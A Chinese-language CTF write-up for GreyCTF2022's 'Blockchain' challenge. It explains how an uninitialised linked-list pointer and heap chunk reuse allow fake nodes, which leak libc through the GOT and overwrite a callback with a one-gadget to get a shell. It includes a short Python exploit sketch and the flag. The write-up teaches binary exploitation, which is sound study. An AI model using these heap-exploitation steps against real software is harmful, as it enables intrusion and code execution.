# GreyCTF2022 - Blockchain

## 题目简述

题名中的 Blockchain 只是链式堆块数据结构，并非区块链题。程序为每个 block 分配堆对象，却没有初始化 `next` 指针；结合释放后的同尺寸重用，可伪造链表后继，进而获得任意地址读写。

## 解题过程

创建、删除不同类型对象，控制空闲 chunk 中残留的数据。当新 block 复用该内存时，未初始化的 `next` 会保留攻击者布置的地址。遍历链表就会把伪地址当作下一个对象。

先让伪节点指向可泄露的 GOT 项，读取 libc 函数地址并计算基址；再重新布置链条，把可写字段对准后续回调或函数指针，写入满足现场约束的 one-gadget。

```python
fake_next = elf.got['puts'] - next_field_offset
reclaim_chunk(payload=p64(fake_next))
leak = traverse_and_show()
libc.address = leak - libc.sym['puts']

fake_next = callback_addr - next_field_offset
reclaim_chunk(payload=p64(fake_next))
edit_node(libc.address + one_gadget)
```

触发退出/回调路径后取得 shell：

```text
grey{g0_clAim_20mil_from_b10ckch4in_compAny_a23l1}
```

## 方法总结

指针字段未初始化时，旧 chunk 内容就是隐式输入。分析链式结构应画出每个字段偏移、遍历时的解引用顺序和分配尺寸；伪节点地址通常需要减去字段偏移，才能让程序最终访问目标字节。
